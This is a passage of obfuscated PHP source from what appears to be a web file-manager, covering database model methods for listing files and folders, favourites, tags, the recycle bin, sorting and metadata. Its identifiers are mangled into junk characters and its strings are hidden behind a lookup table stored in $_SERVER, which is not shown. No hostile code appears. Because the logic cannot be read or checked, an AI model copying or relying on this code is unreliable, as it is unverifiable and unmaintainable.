set($ŞíñŒø“, $ Ô¿‘æ» = false, $µø£ÈÌé = '') { $»¸¯¸ =& $_SERVER[ıÚ˜š²İ]; $this->cacheRemove($µø£ÈÌé); $©Ñ×ƒ¡î = array(); $¤˜„÷î§ = is_array($ŞíñŒø“) ? $ŞíñŒø“ : array($ŞíñŒø“ => $ Ô¿‘æ»); foreach ($¤˜„÷î§ as $Ê’Íåıƒ => $Å»»”šÑ) { if (is_array($Å»»”šÑ)) { $Å»»”šÑ = json_encode_force($Å»»”šÑ); } $this->checkLength($Å»»”šÑ, !1, $this->tableName . $»¸¯¸[4] . $ŞíñŒø“); $Å»»”šÑ = self::textEncode($Å»»”šÑ); $¤˜„÷î§ = array($»¸¯¸[33] => $µø£ÈÌé, $»¸¯¸[97] => $Ê’Íåıƒ, $»¸¯¸[452] => $Å»»”šÑ); $©Ñ×ƒ¡î[] = $this->filterWhere($¤˜„÷î§); } if (!$©Ñ×ƒ¡î) { return !0; } $ô»úù†š = $this->cacheKey($»¸¯¸[478]); CacheLock::lock($ô»úù†š); $ëÕÆƒ‘ = $this->addAll($©Ñ×ƒ¡î, array(), !0); CacheLock::unlock($ô»úù†š); return $ëÕÆƒ‘; } protected function optionDefault($‡§°ƒƒ = '') { return !1; } public function setDeep($¾úƒ¤á, $çæ„Õ„Æ = false, $Å’ÉÙŞè = '') { $©«†€± = explode($_SERVER[ıÚ˜š²İ][10], $¾úƒ¤á); $°››¢™» = $this->get(); array_set_value($°››¢™», $¾úƒ¤á, $çæ„Õ„Æ); $this->set($©«†€±[0], $°››¢™»[$©«†€±[0]], $Å’ÉÙŞè); } public function remove($İÂˆ•¥, $Ä€÷è = '') { $‡à•è€Ö =& $_SERVER[ıÚ˜š²İ]; $this->cacheRemove($Ä€÷è); $ìˆ¤ó…¿ = $this->filterWhere(array($‡à•è€Ö[97] => $İÂˆ•¥, $‡à•è€Ö[33] => $Ä€÷è)); if (is_null($İÂˆ•¥)) { unset($ìˆ¤ó…¿[$‡à•è€Ö[97]]); } return $this->where($ìˆ¤ó…¿)->delete(); } public function cacheSet($Î¤Ù›‚ò, $úÕÁâ·õ = false) { return Cache::set($this->cacheKey($Î¤Ù›‚ò), $úÕÁâ·õ); } public function cacheGet($Ûø™‰®Ï) { return Cache::get($this->cacheKey($Ûø™‰®Ï)); } public function cacheRemove($ºì™õ†ª) { return Cache::remove($this->cacheKey($ºì™õ†ª)); } protected function filterWhere($—å€«ÅŒ) { return $—å€«ÅŒ; } protected function cacheKey($»É‹ªÑ) { return $»É‹ªÑ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\163\x6f\x75\162\x63\145"; protected $tableMeta = array("\x74\141\142\154\x65\116\x61\x6d\145" => "\151\157\x5f\163\x6f\x75\x72\143\x65\137\x6d\x65\x74\141", "\x6d\145\x74\141\106\151\145\x6c\x64" => "\163\157\165\162\143\x65\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\146\x79\124\151\x6d\145", "\x74\151\155\x65", "\x69\156\163\x65\162\x74", "\146\165\156\x63\x74\151\x6f\x6e"), array("\143\162\145\141\x74\x65\x54\x69\x6d\145", "\164\151\155\145", "\151\x6e\x73\145\162\x74", "\x66\x75\156\x63\164\151\157\x6e"), array("\x76\x69\x65\167\124\151\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\x65\x72\164", "\146\165\156\143\x74\151\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($Êœ……˜Œ) { return $this->listSource(array($_SERVER[ıÚ˜š²İ][479] => $Êœ……˜Œ)); } public function typeName($İ€¸Üœü) { static $‡Öåş÷© = array(self::TYPE_SYSTEM => "\x73\171\x73\164\145\155", self::TYPE_USER => "\x75\x73\x65\162", self::TYPE_GROUP => "\x67\162\157\165\160"); return $‡Öåş÷©[$İ€¸Üœü . $_SERVER[ıÚ˜š²İ][12]]; } public function sourceListInfo($ÅœÀÄÃ, $á±‡ø² = false) { $ãåÃò‚ş =& $_SERVER[ıÚ˜š²İ]; $ÅœÀÄÃ = $ÅœÀÄÃ ? $ÅœÀÄÃ : array(); $ÅœÀÄÃ = array_filter(array_unique($ÅœÀÄÃ)); if (!$ÅœÀÄÃ) { return array(); } $‘ÄäÅ—» = $this->where(array($ãåÃò‚ş[194] => array($ãåÃò‚ş[7], $ÅœÀÄÃ)))->select(); $this->_listDataApply($‘ÄäÅ—», $á±‡ø²); return array_to_keyvalue($‘ÄäÅ—», $ãåÃò‚ş[194]); } public function pathInfoFilter(&$›ôêÙÛ) { $ìŸ‹¯”Ø =& $_SERVER[ıÚ˜š²İ]; static $‹ø€˜¢± = false; static $øï´Åİ„ = false; static $‹öÙŞÉë = false; if (!$‹ø€˜¢±) { $ºğš‡†Ú = $ìŸ‹¯”Ø[480]; $ºğš‡†Ú .= $ìŸ‹¯”Ø[481]; $ºğš‡†Ú .= $ìŸ‹¯”Ø[482]; $‹§Ùæ´¡ = $ìŸ‹¯”Ø[483]; $ƒ€½–Š“ = explode($ìŸ‹¯”Ø[50], $‹§Ùæ´¡); $‹ø€˜¢± = explode($ìŸ‹¯”Ø[50], $ºğš‡†Ú); $øï´Åİ„ = array(); foreach ($‹ø€˜¢± as $¾º§Ú) { if (in_array($¾º§Ú, $ƒ€½–Š“)) { continue; } $øï´Åİ„[] = $¾º§Ú; } $‹öÙŞÉë = explode($ìŸ‹¯”Ø[50], $ìŸ‹¯”Ø[484]); } foreach ($‹öÙŞÉë as $ˆ…®¡Œ) { if (isset($›ôêÙÛ[$ˆ…®¡Œ])) { $›ôêÙÛ[$ˆ…®¡Œ] = intval($›ôêÙÛ[$ˆ…®¡Œ]); } } $›ôêÙÛ[$ìŸ‹¯”Ø[87]] = $ìŸ‹¯”Ø[485] . $›ôêÙÛ[$ìŸ‹¯”Ø[194]] . $ìŸ‹¯”Ø[486]; $›ôêÙÛ[$ìŸ‹¯”Ø[33]] = $›ôêÙÛ[$ìŸ‹¯”Ø[487]] == 1 ? $ìŸ‹¯”Ø[78] : $ìŸ‹¯”Ø[233]; $›ôêÙÛ[$ìŸ‹¯”Ø[191]] = $this->typeName($›ôêÙÛ[$ìŸ‹¯”Ø[191]]); if ($›ôêÙÛ[$ìŸ‹¯”Ø[487]] != 1) { $›ôêÙÛ[$ìŸ‹¯”Ø[169]] = $›ôêÙÛ[$ìŸ‹¯”Ø[488]]; unset($›ôêÙÛ[$ìŸ‹¯”Ø[488]]); } $ù¹ìğÓì = $‹ø€˜¢±; if (isset($›ôêÙÛ[$ìŸ‹¯”Ø[489]]) && $›ôêÙÛ[$ìŸ‹¯”Ø[489]][$ìŸ‹¯”Ø[490]] == -1) { $ù¹ìğÓì = $øï´Åİ„; } $›ôêÙÛ = array_field_key($›ôêÙÛ, $ù¹ìğÓì); return $›ôêÙÛ; } public function listUserFav() { $–ÕœíÈµ =& $_SERVER[ıÚ˜š²İ]; $½ìºÇ¥Ö = Model($–ÕœíÈµ[491])->listData(); $îèõÙ±¾ = array_filter_by_field($½ìºÇ¥Ö, $–ÕœíÈµ[33], $–ÕœíÈµ[492]); $îèõÙ±¾ = array_to_keyvalue($îèõÙ±¾, $–ÕœíÈµ[12], $–ÕœíÈµ[87]); if ($îèõÙ±¾) { $ ì®ñßá = $this->listSource(array($–ÕœíÈµ[493] => array($–ÕœíÈµ[494], $îèõÙ±¾))); } $ ì®ñßá = array_to_keyvalue($ ì®ñßá[$–ÕœíÈµ[447]], $–ÕœíÈµ[194]); foreach ($½ìºÇ¥Ö as &$İ·ÉáÀš) { $İ·ÉáÀš = array($–ÕœíÈµ[495] => $İ·ÉáÀš[$–ÕœíÈµ[477]], $–ÕœíÈµ[496] => $İ·ÉáÀš[$–ÕœíÈµ[32]], $–ÕœíÈµ[497] => $İ·ÉáÀš[$–ÕœíÈµ[87]], $–ÕœíÈµ[498] => $İ·ÉáÀš[$–ÕœíÈµ[33]], $–ÕœíÈµ[499] => $İ·ÉáÀš[$–ÕœíÈµ[234]], $–ÕœíÈµ[500] => $İ·ÉáÀš[$–ÕœíÈµ[88]]); if ($İ·ÉáÀš[$–ÕœíÈµ[33]] == $–ÕœíÈµ[492] && $ ì®ñßá[$İ·ÉáÀš[$–ÕœíÈµ[87]]]) { $İ·ÉáÀš[$–ÕœíÈµ[90]] = $ ì®ñßá[$İ·ÉáÀš[$–ÕœíÈµ[87]]]; } } unset($İ·ÉáÀš); return $½ìºÇ¥Ö; } public function listUserTag($šåîº½) { $÷’‚‰ãé =& $_SERVER[ıÚ˜š²İ]; if ($šåîº½ && !is_array($šåîº½)) { $šåîº½ = array($šåîº½); } $ë±Öµ¢­ = Model($÷’‚‰ãé[501])->listData(); $…ò†ä‚ó = array(); $¦ÄĞå… = array(); foreach ($ë±Öµ¢­ as $©ªËã‘) { $ğ¹§•û = $©ªËã‘[$÷’‚‰ãé[87]]; if (!$ğ¹§•û) { continue; } if (!isset($¦ÄĞå…[$ğ¹§•û])) { $¦ÄĞå…[$ğ¹§•û] = array(); } $¦ÄĞå…[$ğ¹§•û][] = $©ªËã‘[$÷’‚‰ãé[502]]; $…ò†ä‚ó[$©ªËã‘[$÷’‚‰ãé[87]]] = $©ªËã‘; } $—¤‘Í—¤ = array(); $®†¡š“È = array(); $µı¹ç°¼ = array(); foreach ($¦ÄĞå… as $Œú½·Î => $ãÚµ ¸—) { $œ§š¤ = !0; if (!$šåîº½) { $—¤‘Í—¤[] = $Œú½·Î; continue; } foreach ($šåîº½ as $¯èºÄ§€) { if (!in_array($¯èºÄ§€, $ãÚµ ¸—)) { $œ§š¤ = !1; break; } } if (!$œ§š¤) { continue; } if (!is_numeric($Œú½·Î)) { $öÆ¬ŒÖ = $…ò†ä‚ó[$Œú½·Î]; $¥½¾ —Ú = array($÷’‚‰ãé[32] => $öÆ¬ŒÖ[$÷’‚‰ãé[32]], $÷’‚‰ãé[87] => $öÆ¬ŒÖ[$÷’‚‰ãé[87]], $÷’‚‰ãé[33] => $öÆ¬ŒÖ[$÷’‚‰ãé[33]], $÷’‚‰ãé[90] => array($÷’‚‰ãé[503] => 1), $÷’‚‰ãé[235] => !0); if ($öÆ¬ŒÖ[$÷’‚‰ãé[33]] == $÷’‚‰ãé[233]) { $µı¹ç°¼[] = $¥½¾ —Ú; } if ($öÆ¬ŒÖ[$÷’‚‰ãé[33]] == $÷’‚‰ãé[78]) { $®†¡š“È[] = $¥½¾ —Ú; } continue; } $—¤‘Í—¤[] = $Œú½·Î; } if ($—¤‘Í—¤) { $¼Şá£Ç = $this->listSource(array($÷’‚‰ãé[493] => array($÷’‚‰ãé[494], $—¤‘Í—¤))); } $¼Şá£Ç = $¼Şá£Ç ? $¼Şá£Ç : array($÷’‚‰ãé[85] => array(), $÷’‚‰ãé[86] => array()); $¼Şá£Ç[$÷’‚‰ãé[85]] = array_merge($¼Şá£Ç[$÷’‚‰ãé[85]], $®†¡š“È); $¼Şá£Ç[$÷’‚‰ãé[86]] = array_merge($¼Şá£Ç[$÷’‚‰ãé[86]], $µı¹ç°¼); if (isset($¼Şá£Ç[$÷’‚‰ãé[444]]) && count($—¤‘Í—¤) == $¼Şá£Ç[$÷’‚‰ãé[444]][$÷’‚‰ãé[445]]) { return $¼Şá£Ç; } $Üó±ªµ = array(); $é¨üüê„ = array_to_keyvalue($¼Şá£Ç[$÷’‚‰ãé[85]], $÷’‚‰ãé[12], $÷’‚‰ãé[194]); $¨ˆ¶Ñ¡² = array_to_keyvalue($¼Şá£Ç[$÷’‚‰ãé[86]], $÷’‚‰ãé[12], $÷’‚‰ãé[194]); $ø¢¶ñí = array_merge($¨ˆ¶Ñ¡², $é¨üüê„); foreach ($—¤‘Í—¤ as $ğ¹§•û) { if (!in_array($ğ¹§•û, $ø¢¶ñí)) { $Üó±ªµ[] = $ğ¹§•û; } } if ($Üó±ªµ) { Model($÷’‚‰ãé[504])->removeBySource($Üó±ªµ); } return $¼Şá£Ç; } public function listUserRecycle() { $‹¤¼šš =& $_SERVER[ıÚ˜š²İ]; $¹ı‡ø½­ = Model($‹¤¼šš[505])->listData(); if (!$¹ı‡ø½­) { return array(); } $Õ•ÑóÉ = array($‹¤¼šš[493] => array($‹¤¼šš[494], $¹ı‡ø½­), $‹¤¼šš[506] => 1); return $this->listSource($Õ•ÑóÉ); } public function listSource($ğô™˜Ûò, $Ì²Õé¡ó = 3000, $ŒºõÓ³« = false) { $èÔ‡ÂûÀ =& $_SERVER[ıÚ˜š²İ]; if (!isset($ğô™˜Ûò[$èÔ‡ÂûÀ[507]])) { $ğô™˜Ûò[$èÔ‡ÂûÀ[507]] = 0; } if (isset($ğô™˜Ûò[$èÔ‡ÂûÀ[193]]) && $ğô™˜Ûò[$èÔ‡ÂûÀ[193]] == $èÔ‡ÂûÀ[231]) { $ğô™˜Ûò[$èÔ‡ÂûÀ[488]] = array($èÔ‡ÂûÀ[508], $èÔ‡ÂûÀ[12]); } $°¬¢¬ƒ = $èÔ‡ÂûÀ[509]; $ÇØ¢³® = $this->field($°¬¢¬ƒ)->_makeOrder()->where($ğô™˜Ûò)->selectPage($Ì²Õé¡ó); $this->_listPageCheck($ÇØ¢³®, $°¬¢¬ƒ, $ğô™˜Ûò); $this->_listDataApply($ÇØ¢³®[$èÔ‡ÂûÀ[447]], $ŒºõÓ³«); $this->_listMake($ÇØ¢³®); return $ÇØ¢³®; } private function _listPageCheck(&$Ô¯ˆ´‰, $³Š¥–, $»¡·¦ú°) { $¯Î¦ËÔ =& $_SERVER[ıÚ˜š²İ]; if (!is_array($Ô¯ˆ´‰[$¯Î¦ËÔ[444]])) { return; } $¬÷Ú™¿º = $Ô¯ˆ´‰[$¯Î¦ËÔ[444]]; if ($¬÷Ú™¿º[$¯Î¦ËÔ[446]] <= 1) { return; } if ($¬÷Ú™¿º[$¯Î¦ËÔ[445]] >= 100000) { return; } if (Model($¯Î¦ËÔ[510])->get($¯Î¦ËÔ[511]) != $¯Î¦ËÔ[512]) { return; } $³Š¥– = str_replace(array($¯Î¦ËÔ[53], $¯Î¦ËÔ[419], $¯Î¦ËÔ[288]), $¯Î¦ËÔ[12], $³Š¥–); $³Š¥– = $¯Î¦ËÔ[513] . str_replace($¯Î¦ËÔ[50], $¯Î¦ËÔ[514], $³Š¥–) . $¯Î¦ËÔ[515]; $Âû”‰ü¬ = $¯Î¦ËÔ[516]; $Âû”‰ü¬ = $Âû”‰ü¬ . $¯Î¦ËÔ[517]; $ø±éµ¨Ô = $¬÷Ú™¿º[$¯Î¦ËÔ[441]] * ($¬÷Ú™¿º[$¯Î¦ËÔ[430]] - 1) . $¯Î¦ËÔ[50] . $¬÷Ú™¿º[$¯Î¦ËÔ[441]]; $¢Äöİäé = $this->_makeOrder(!0); $„¨±µÁû = $¯Î¦ËÔ[513] . str_replace($¯Î¦ËÔ[50], $¯Î¦ËÔ[514], $¢Äöİäé[0]); if (strpos($„¨±µÁû, $¯Î¦ËÔ[518])) { $„¨±µÁû = str_replace($¯Î¦ËÔ[518], $¯Î¦ËÔ[519], $„¨±µÁû); } else { $„¨±µÁû .= $¯Î¦ËÔ[520] . $¢Äöİäé[1]; } $¢û¥ÙÂ‘ = array(); foreach ($»¡·¦ú° as $üšÂ¬¬ => $Û€šË ) { $¢û¥ÙÂ‘[$¯Î¦ËÔ[513] . $üšÂ¬¬] = $Û€šË ; } $this->alias($¯Î¦ËÔ[521])->field($³Š¥–)->limit($ø±éµ¨Ô)->order($„¨±µÁû); $•ÄŞË¥¤ = $this->join($Âû”‰ü¬)->where($¢û¥ÙÂ‘)->select(); if ($•ÄŞË¥¤) { $Ô¯ˆ´‰[$¯Î¦ËÔ[447]] = $•ÄŞË¥¤; } } protected function _makeOrder($õã‚•Ã = false) { $¡ë°ß›ø =& $_SERVER[ıÚ˜š²İ]; $•Ç»½Ü = Model($¡ë°ß›ø[522])->get($¡ë°ß›ø[523]); $ØÖ³…Õ = Model($¡ë°ß›ø[522])->get($¡ë°ß›ø[524]); $á´¥¨òú = array($¡ë°ß›ø[525] => $¡ë°ß›ø[526], $¡ë°ß›ø[527] => $¡ë°ß›ø[528]); $¢Õãá‡ı = array($¡ë°ß›ø[32] => $¡ë°ß›ø[32], $¡ë°ß›ø[79] => $¡ë°ß›ø[79], $¡ë°ß›ø[169] => $¡ë°ß›ø[488], $¡ë°ß›ø[529] => $¡ë°ß›ø[529], $¡ë°ß›ø[530] => $¡ë°ß›ø[531], $¡ë°ß›ø[234] => $¡ë°ß›ø[234], $¡ë°ß›ø[88] => $¡ë°ß›ø[88]); $ò§»‚ä = Input::get($¡ë°ß›ø[532], $¡ë°ß›ø[7], $•Ç»½Ü, array_keys($¢Õãá‡ı)); $ñàô¿µ» = Input::get($¡ë°ß›ø[533], $¡ë°ß›ø[7], $ØÖ³…Õ, array_keys($á´¥¨òú)); if (!in_array($ò§»‚ä, array_keys($¢Õãá‡ı))) { $ò§»‚ä = $¡ë°ß›ø[32]; } if (!in_array($ñàô¿µ», array_keys($á´¥¨òú))) { $ò§»‚ä = $¡ë°ß›ø[525]; } if ($ò§»‚ä == $¡ë°ß›ø[32]) { } $Ø§­ÕŠ§ = $¡ë°ß›ø[534] . $¢Õãá‡ı[$ò§»‚ä] . $¡ë°ß›ø[53] . $á´¥¨òú[$ñàô¿µ»]; $Ø§­ÕŠ§ = rtrim(trim($Ø§­ÕŠ§), $¡ë°ß›ø[50]); if ($õã‚•Ã) { return array($Ø§­ÕŠ§, $á´¥¨òú[$ñàô¿µ»]); } return $this->order($Ø§­ÕŠ§); } protected function _listDataApplyItem($€ãÈµ„Â, $± €Å³ = false) { $®‚õÓö¥ = array($€ãÈµ„Â); $this->_listDataApply($®‚õÓö¥, $± €Å³); return $®‚õÓö¥[0]; } protected function _listDataApply(&$Æèõ²µî, $Ü¶ıê ë = false) { $ÂÄÌ¢‡Â =& $_SERVER[ıÚ˜š²İ]; if (!$Æèõ²µî) { $Æèõ²µî = array(); return; } $ûíÚø¦Ç = array_to_keyvalue($Æèõ²µî, $ÂÄÌ¢‡Â[12], $ÂÄÌ¢‡Â[194]); $ûíÚø¦Ç = array_unique($ûíÚø¦Ç); $this->_listSourceCache($Æèõ²µî); if (!$Ü¶ıê ë) { $this->_listAppendMeta($Æèõ²µî, $ûíÚø¦Ç); $this->_listAppendFileMeta($Æèõ²µî, $ûíÚø¦Ç); $this->_listAppendChildren($Æèõ²µî, $ûíÚø¦Ç); } $this->_listAppendPath($Æèõ²µî); $this->_listAppendAuth($Æèõ²µî); $this->_listAppendSourceInfo($Æèõ²µî, $ûíÚø¦Ç); $this->_listAppendUser($Æèõ²µî); $this->_listFilterInfo($Æèõ²µî, $Ü¶ıê ë); $this->_listAppendAuthSecret($Æèõ²µî); } protected function _listSourceCache($‡ş«š•) { $Ä‰ÎŸ¶ =& $_SERVER[ıÚ˜š²İ]; foreach ($‡ş«š• as $È·²èŞ¶) { self::$cacheSourceInfo[$Ä‰ÎŸ¶[535] . $È·²èŞ¶[$Ä‰ÎŸ¶[194]]] = $È·²èŞ¶; } } protected function _listFilterInfo(&$ÜáÆŒé, $µ¢³…×â = false) { $ä»Û·¥Î =& $_SERVER[ıÚ˜š²İ]; foreach ($ÜáÆŒé as &$¢†ŠóÉø) { $¢†ŠóÉø = $this->pathInfoFilter($¢†ŠóÉø); self::$cachePathInfo[$ä»Û·¥Î[536] . intval($µ¢³…×â) . $ä»Û·¥Î[464] . $¢†ŠóÉø[$ä»Û·¥Î[194]]] = $¢†ŠóÉø; } unset($¢†ŠóÉø); } protected function _listMake(&$Áâô–ÔŠ) { $åãôøƒÅ =& $_SERVER[ıÚ˜š²İ]; $Áâô–ÔŠ[$åãôøƒÅ[85]] = array(); $Áâô–ÔŠ[$åãôøƒÅ[86]] = array(); foreach ($Áâô–ÔŠ[$åãôøƒÅ[447]] as $—…¿ĞŒÅ) { $ÈÙò®¤ = $—…¿ĞŒÅ[$åãôøƒÅ[487]] == 1 ? $åãôøƒÅ[85] : $åãôøƒÅ[86]; $Áâô–ÔŠ[$ÈÙò®¤][] = $—…¿ĞŒÅ; } unset($Áâô–ÔŠ[$åãôøƒÅ[447]]); } protected function _listAppendMeta(&$§ŸÎÈÍ£, $«¬ğÒ) { $Àë€€¯ =& $_SERVER[ıÚ˜š²İ]; $Ì‡±¢«Ô = array($Àë€€¯[493] => array($Àë€€¯[494], $«¬ğÒ)); $Ë§¢ØÑ = Model($Àë€€¯[537])->field($Àë€€¯[538])->where($Ì‡±¢«Ô)->select(); if (!$Ë§¢ØÑ) { return; } $Ÿ¿íÄı = array($Àë€€¯[539], $Àë€€¯[540], $Àë€€¯[519]); $ÓÉïš÷ = array(); foreach ($Ë§¢ØÑ as $¬ÖîÆÚ®) { if (!isset($ÓÉïš÷[$¬ÖîÆÚ®[$Àë€€¯[194]]])) { $ÓÉïš÷[$¬ÖîÆÚ®[$Àë€€¯[194]]] = array(); } if (in_array($¬ÖîÆÚ®[$Àë€€¯[97]], $Ÿ¿íÄı)) { continue; } if ($¬ÖîÆÚ®[$Àë€€¯[97]] == $Àë€€¯[541]) { $¬ÖîÆÚ®[$Àë€€¯[452]] = $Àë€€¯[542]; } $ÓÉïš÷[$¬ÖîÆÚ®[$Àë€€¯[194]]][$¬ÖîÆÚ®[$Àë€€¯[97]]] = $¬ÖîÆÚ®[$Àë€€¯[452]]; } foreach ($§ŸÎÈÍ£ as &$Ë£ñµ¯è) { $Ë£ñµ¯è[$Àë€€¯[543]] = !1; if (isset($ÓÉïš÷[$Ë£ñµ¯è[$Àë€€¯[194]]])) { $Ë£ñµ¯è[$Àë€€¯[543]] = $ÓÉïš÷[$Ë£ñµ¯è[$Àë€€¯[194]]]; } if ($this->fileIsLock($Ë£ñµ¯è) && $Ë£ñµ¯è[$Àë€€¯[489]]) { $ÇÓô ªà = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $Ë£ñµ¯è[$Àë€€¯[489]][$Àë€€¯[490]] = AuthModel::authDisable($Ë£ñµ¯è[$Àë€€¯[489]][$Àë€€¯[490]], $ÇÓô ªà); $Ë£ñµ¯è[$Àë€€¯[489]][$Àë€€¯[544]][$Àë€€¯[489]] = $Ë£ñµ¯è[$Àë€€¯[489]][$Àë€€¯[490]]; } } unset($Ë£ñµ¯è); } protected function _listAppendFileMeta(&$¬ á÷˜—, $¶ı ¾šñ) { $¸›İ€Š =& $_SERVER[ıÚ˜š²İ]; $€±Ñ×—ß = array_to_keyvalue($¬ á÷˜—, $¸›İ€Š[12], $¸›İ€Š[545]); $€±Ñ×—ß = array_filter(array_unique($€±Ñ×—ß)); if (!$€±Ñ×—ß) { return; } $Íâ¦á‹“ = array($¸›İ€Š[546] => array($¸›İ€Š[494], $€±Ñ×—ß)); $ÜÊøÏœŒ = $¸›İ€Š[547]; $¥›•¹«‹ = Model($¸›İ€Š[548])->field($ÜÊøÏœŒ)->where($Íâ¦á‹“)->select(); $¥›•¹«‹ = array_to_keyvalue($¥›•¹«‹, $¸›İ€Š[545]); $°«„åö = Model($¸›İ€Š[549])->field($¸›İ€Š[550])->where($Íâ¦á‹“)->select(); $°«„åö = $°«„åö ? $°«„åö : array(); $÷ÀŸõÛÎ = array(); foreach ($°«„åö as $‚Í¾Ñş‡) { if (!isset($÷ÀŸõÛÎ[$‚Í¾Ñş‡[$¸›İ€Š[545]]])) { $÷ÀŸõÛÎ[$‚Í¾Ñş‡[$¸›İ€Š[545]]] = array(); } $÷ÀŸõÛÎ[$‚Í¾Ñş‡[$¸›İ€Š[545]]][$‚Í¾Ñş‡[$¸›İ€Š[97]]] = $‚Í¾Ñş‡[$¸›İ€Š[452]]; } foreach ($¬ á÷˜— as &$·ÀŞ˜óØ) { $¿¶²™À‰ = $·ÀŞ˜óØ[$¸›İ€Š[545]]; if (!$¿¶²™À‰ || !is_array($¥›•¹«‹[$¿¶²™À‰])) { continue; } $Ú›ĞÒ¿À = $¥›•¹«‹[$¿¶²™À‰]; $Ú›ĞÒ¿À[$¸›İ€Š[79]] = $·ÀŞ˜óØ[$¸›İ€Š[79]]; $Ú›ĞÒ¿À[$¸›İ€Š[32]] = $·ÀŞ˜óØ[$¸›İ€Š[32]]; if (!$Ú›ĞÒ¿À[$¸›İ€Š[551]]) { Model($¸›İ€Š[548])->fileMd5Check($Ú›ĞÒ¿À); } if (!isset(self::$cacheFileInfo[$¸›İ€Š[552] . $¿¶²™À‰])) { self::$cacheFileInfo[$¸›İ€Š[552] . $¿¶²™À‰] = array_merge(array(), $Ú›ĞÒ¿À); } unset($¥›•¹«‹[$¿¶²™À‰][$¸›İ€Š[87]]); $–”šÏ”˜ = isset($÷ÀŸõÛÎ[$¿¶²™À‰]) && is_array($÷ÀŸõÛÎ[$¿¶²™À‰]) ? $÷ÀŸõÛÎ[$¿¶²™À‰] : array(); $·ÀŞ˜óØ[$¸›İ€Š[170]] = array_merge($–”šÏ”˜, $¥›•¹«‹[$¿¶²™À‰]); if (isset($·ÀŞ˜óØ[$¸›İ€Š[170]][$¸›İ€Š[185]])) { $·ÀŞ˜óØ[$¸›İ€Š[185]] = json_decode($·ÀŞ˜óØ[$¸›İ€Š[170]][$¸›İ€Š[185]], !0); unset($·ÀŞ˜óØ[$¸›İ€Š[170]][$¸›İ€Š[185]]); } } unset($·ÀŞ˜óØ); } protected function _listAppendSourceInfo(&$šÒ·¬ÑÔ, $åò•ûˆˆ) { $¯öÜñ³ =& $_SERVER[ıÚ˜š²İ]; $æÚï«ôÁ = Model($¯öÜñ³[553])->listData(); $ê– ‹ğ™ = Model($¯öÜñ³[501])->listData(); $ŠœÉ½Ú = Model($¯öÜñ³[491])->listData(); $à©å·Æ± = Model($¯öÜñ³[554])->listSimple(); $ÎÆ“Ø¯¹ = array_to_keyvalue($æÚï«ôÁ, $¯öÜñ³[477]); $£‡ğÖ…Œ = array_to_keyvalue_group($ê– ‹ğ™, $¯öÜñ³[87], $¯öÜñ³[502]); $ô¡ä‡Ú¾ = array_to_keyvalue($ŠœÉ½Ú, $¯öÜñ³[87]); $Ó›ÚÙÔ¸ = array_to_keyvalue_group($à©å·Æ±, $¯öÜñ³[194]); foreach ($šÒ·¬ÑÔ as &$‰€İ–ÓÅ) { $‰€İ–ÓÅ[$¯öÜñ³[90]] = array($¯öÜñ³[555] => 0, $¯öÜñ³[556] => 0, $¯öÜñ³[557] => 0); if (isset($ô¡ä‡Ú¾[$‰€İ–ÓÅ[$¯öÜñ³[194]]])) { $‰€İ–ÓÅ[$¯öÜñ³[90]][$¯öÜñ³[558]] = 1; $‰€İ–ÓÅ[$¯öÜñ³[90]][$¯öÜñ³[559]] = $ô¡ä‡Ú¾[$‰€İ–ÓÅ[$¯öÜñ³[194]]][$¯öÜñ³[32]]; } if ($£‡ğÖ…Œ && $ÎÆ“Ø¯¹ && isset($£‡ğÖ…Œ[$‰€İ–ÓÅ[$¯öÜñ³[194]]])) { $‰€İ–ÓÅ[$¯öÜñ³[90]][$¯öÜñ³[560]] = array(); foreach ($£‡ğÖ…Œ[$‰€İ–ÓÅ[$¯öÜñ³[194]]] as $ÌÕŸÎÙ€) { $Ø€ôµ™ = $ÎÆ“Ø¯¹[$ÌÕŸÎÙ€]; $‰€İ–ÓÅ[$¯öÜñ³[90]][$¯öÜñ³[560]][] = array($¯öÜñ³[561] => $Ø€ôµ™[$¯öÜñ³[477]], $¯öÜñ³[496] => $Ø€ôµ™[$¯öÜñ³[32]], $¯öÜñ³[562] => $Ø€ôµ™[$¯öÜñ³[563]]); } } if ($Ó›ÚÙÔ¸ && isset($Ó›ÚÙÔ¸[$‰€İ–ÓÅ[$¯öÜñ³[194]]])) { $‰€İ–ÓÅ[$¯öÜñ³[90]][$¯öÜñ³[564]] = array(); foreach ($Ó›ÚÙÔ¸[$‰€İ–ÓÅ[$¯öÜñ³[194]]] as $Õ³½›¿Æ) { $™øÇ¯Ö = $¯öÜñ³[565]; if ($Õ³½›¿Æ[$¯öÜñ³[566]] == $¯öÜñ³[91]) { $™øÇ¯Ö .= $¯öÜñ³[567]; } $‰€İ–ÓÅ[$¯öÜñ³[90]][$¯öÜñ³[564]] = array_field_key($Õ³½›¿Æ, explode($¯öÜñ³[50], $™øÇ¯Ö)); } } } unset($‰€İ–ÓÅ); return $šÒ·¬ÑÔ; } protected function _listAppendChildren(&$‰ ÷¶Âò, $è‰ÔË‘á) { $‰ƒœ¯×¼ =& $_SERVER[ıÚ˜š²İ]; $›Ö«Œêî = array(); $Ê”°îÅÊ = array($‰ƒœ¯×¼[242] => 0, $‰ƒœ¯×¼[243] => 0); foreach ($‰ ÷¶Âò as &$è‹§—Š) { if (!$è‹§—Š[$‰ƒœ¯×¼[487]]) { continue; } $›Ö«Œêî[] = $è‹§—Š[$‰ƒœ¯×¼[194]]; } unset($è‹§—Š); if (!$›Ö«Œêî) { return; } $··ÕÂ€˜ = array($‰ƒœ¯×¼[193] => array($‰ƒœ¯×¼[7], $›Ö«Œêî), $‰ƒœ¯×¼[507] => 0); $ÔÊ§ñøí = array($‰ƒœ¯×¼[193], $‰ƒœ¯×¼[487], $‰ƒœ¯×¼[568] => $‰ƒœ¯×¼[569]); $¥¤ŒÒóØ = $this->field($ÔÊ§ñøí)->where($··ÕÂ€˜)->group($‰ƒœ¯×¼[570])->select(); $›‘µÓÏ¼ = array(); foreach ($¥¤ŒÒóØ as $ß¶İš¿±) { $ƒÜæ“ÏÁ = $ß¶İš¿±[$‰ƒœ¯×¼[193]]; $°ÅÕ¾äò = $ß¶İš¿±[$‰ƒœ¯×¼[487]] == $‰ƒœ¯×¼[91] ? $‰ƒœ¯×¼[243] : 